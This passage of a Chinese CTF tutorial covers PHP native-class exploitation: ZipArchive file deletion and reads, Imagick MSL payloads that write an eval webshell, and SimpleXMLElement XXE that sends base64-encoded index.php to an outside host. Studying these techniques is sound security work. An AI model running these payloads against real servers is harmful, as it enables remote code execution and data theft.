+<h3 id="目录遍历-GlobIterator"><a href="#目录遍历-GlobIterator" class="headerlink" title="目录遍历:GlobIterator"></a>目录遍历:<code>GlobIterator</code></h3><p>利用版本：(PHP 5 &gt;&#x3D; 5.3.0, PHP 7)<code>GlobIterator</code>无需配合 glob:&#x2F;&#x2F; 协议枚举目录。</p>
+<pre><code class="highlight plaintext">foreach(new GlobIterator(&quot;./*&quot;) as $f)&#123;    echo $f.&quot;\n&quot;; &#125;</code></pre>
+
+<p>在 CTF 中如果知道了 flag 的位置，但不知道 flag 的文件名，则可以使用:<code>GlobIterator(&quot;/*flag*&quot;)</code></p>
+<h3 id="文件操作-ZipArchive"><a href="#文件操作-ZipArchive" class="headerlink" title="文件操作:ZipArchive"></a>文件操作:ZipArchive</h3><p>利用版本: (PHP 5 &gt;&#x3D; 5.2.0, PHP 7, PECL zip &gt;&#x3D; 1.1.0)</p>
+<p>这个类是在php5.2.0之后引入的，我们之前会在一些原生类利用中见到它，我们可以用这个类来删除文件，读取文件以及有损写文件。</p>
+<p><strong>删除文件</strong></p>
+<pre><code class="highlight plaintext">$a=new ZipArchive();
+$a-&gt;open(&quot;file&quot;, ZipArchive::OVERWRITE); // ZipArchive::CREATE也可以用8代替</code></pre>
+
+<p><strong>读取文件</strong></p>
+<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
+$zip=new ZipArchive();
+$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
+$zip-&gt;addFile($f);
+$zip-&gt;close();
+$zip-&gt;open(&quot;a.zip&quot;);
+echo $zip-&gt;getFromName($f);
+$zip-&gt;close();</code></pre>
+
+<p><strong>有损写文件</strong></p>
+<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
+$zip=new ZipArchive();
+$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
+$zip-&gt;setArchiveComment(&quot;&lt;?php phpinfo();?&gt;&quot;);
+$zip-&gt;addFromString(&quot;file&quot;, &quot;&quot;);
+$zip-&gt;close();
+//include &quot;a.zip&quot;;</code></pre>
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM</a> 这篇文章的作者在应对如下场景时找到了一种新的利用手法——Imagick。</p>
+<pre><code class="highlight plaintext">new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</code></pre>
+
+<p>如果仅可控类名和一个参数名，且只能够实例化对象，不能执行对象方法的情况下，同样可以实现 RCE。</p>
+<h3 id="空字节截断"><a href="#空字节截断" class="headerlink" title="空字节截断"></a>空字节截断</h3><p>Imagick 参数被空字节截断也可以正常使用</p>
+<pre><code class="highlight plaintext"># No errors $a = new Imagick(&quot;/tmp/positive.png\x00.jpg&quot;); # No errors $a = new Imagick(&quot;http://attacker.com/test\x00test&quot;);</code></pre>
+
+<h3 id="https"><a href="#https" class="headerlink" title="https:&#x2F;"></a>https:&#x2F;</h3><p>https:&#x2F; 会调用 curl</p>
+<pre><code class="highlight plaintext">$a = new Imagick(&quot;https:/127.0.0.1:9999/positive.png\x00.jpg&quot;);</code></pre>
+
+<h3 id="vid-tempfile-RCE"><a href="#vid-tempfile-RCE" class="headerlink" title="vid + tempfile RCE"></a>vid + tempfile RCE</h3><p>php 会将 post 接收到的文件以临时文件的形式保存在 &#x2F;tmp 下。假设我们上传一个 msl 文件如下</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;caption:&lt;?php @eval(@$_REQUEST[&#x27;a&#x27;]); ?&gt;&quot; /&gt; &lt;!-- Relative paths such as info:./../../uploads/swarm.php can be used as well --&gt; &lt;write filename=&quot;info:/var/www/swarm.php&quot; /&gt; &lt;/image&gt;</code></pre>
+
+<p>如果使用 vid:msl 的形式将该临时文件进行读取，解析 msl 时会将 webshell 的内容写入 &#x2F;var&#x2F;www&#x2F;swarm.php</p>
+<pre><code class="highlight plaintext">$a = new Imagick(&quot;vid:msl:/tmp/php*&quot;);</code></pre>
+
+<p>CISCN 2022 有根据这个知识点出过题：<a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">CTF-Challenges&#x2F;CISCN&#x2F;2022&#x2F;backdoor&#x2F;writup&#x2F;writup.md at master · AFKL-CUIT&#x2F;CTF-Challenges · GitHub</a>，但利用 payload 有所区别, 使用 inline 将文件内容以 base64 的形式编码在 msl 文件中。</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt; &lt;write filename=&quot;/tmp/sess_afkl&quot; /&gt; &lt;/image&gt;</code></pre>
+
+<p>SCTF 2023 中对这种利用方式进行了探索，可以达到读取文件内容的效果。</p>
+<pre><code class="highlight xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="tag">&lt;<span class="name">image</span>&gt;</span> <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;mvg:/flag&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/xxxx&quot;</span> /&gt;</span> <span class="tag">&lt;/<span class="name">image</span>&gt;</span></code></pre>
+
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><pre><code class="highlight plaintext"> class SimpleXMLElement implements Stringable, Countable, RecursiveIterator &#123;
+    /* Methods */
+    public __construct(
+        string $data,
+        int $options = 0,
+        bool $dataIsURL = false,
+        string $namespaceOrPrefix = &quot;&quot;,
+        bool $isPrefix = false
+    )
+    public addAttribute(string $qualifiedName, string $value, ?string $namespace = null): void
+    public addChild(string $qualifiedName, ?string $value = null, ?string $namespace = null): ?SimpleXMLElement
+    public asXML(?string $filename = null): string|bool
+    public attributes(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
+    public children(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
+    public count(): int
+    public getDocNamespaces(bool $recursive = false, bool $fromRoot = true): array|false
+    public getName(): string
+    public getNamespaces(bool $recursive = false): array
+    public registerXPathNamespace(string $prefix, string $namespace): bool
+    public __toString(): string
+    public xpath(string $expression): array|null|false
+&#125;</code></pre>
+
+<ul>
+<li>data: xml 字符串，xml 文档路径或者 url 路径（如果 dataIsURL 为 true</li>
+<li>dataIsURL: 默认情况下为 false，为 true 时 data 为一个 url 路径</li>
+<li>option：设置为 LIBXML_NOENT 时，可能会导致 xxe 攻击，LIBXML_NOENT 为 2.</li>
+</ul>
+<p><strong>读取文件</strong></p>
+<p>poc:</p>
+<pre><code class="highlight plaintext">$x=new SimpleXMLElement(&quot;http://xxx.xxx.xxx.xxx/evil.xml&quot;,2,true);</code></pre>
+
+<p>evil.xml</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE ANY[   &lt;!ENTITY % remote SYSTEM &quot;http://xxx.xxx.xxx.xxx/send.xml&quot;&gt;   %remote;   %all;   %send;   ]&gt;</code></pre>
+
+<p>send.xml</p>
+<pre><code class="highlight plaintext">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;   &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/send.php?file=%file;&#x27;&gt;&quot;&gt;</code></pre>
+
+<h3 id="SimpleXMLIterator"><a href="#SimpleXMLIterator" class="headerlink" title="SimpleXMLIterator"></a><code>SimpleXMLIterator</code></h3><p>可用于代替 <code>SimpleXMLElement</code></p>
+]]></content>
       <tags>
         <tag>-Web</tag>
       </tags>
